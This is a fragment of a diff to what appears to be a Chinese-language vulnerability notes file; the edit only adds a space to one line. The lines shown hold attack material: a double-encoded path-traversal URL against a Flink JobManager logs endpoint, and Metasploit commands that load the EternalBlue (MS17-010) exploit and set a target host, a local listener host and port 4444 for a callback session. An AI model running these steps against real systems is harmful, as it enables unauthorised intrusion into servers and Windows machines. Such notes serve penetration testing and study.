@@ -56,7 +56,7 @@ http://<IP地址>:8081/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252
 ```
 msfconsole 
 # options 和 payload 设置如下
-msf >use exploit/windows/smb/ms17_010_eternalblue (加载攻击模块)
+msf > use exploit/windows/smb/ms17_010_eternalblue (加载攻击模块)
 msf > set RHOST 192.168.92.129（被攻击机IP）
 msf >set LHOST 192.168.92.132（设置本地IP）
 msf >set LPORT 4444(设置连接端口)
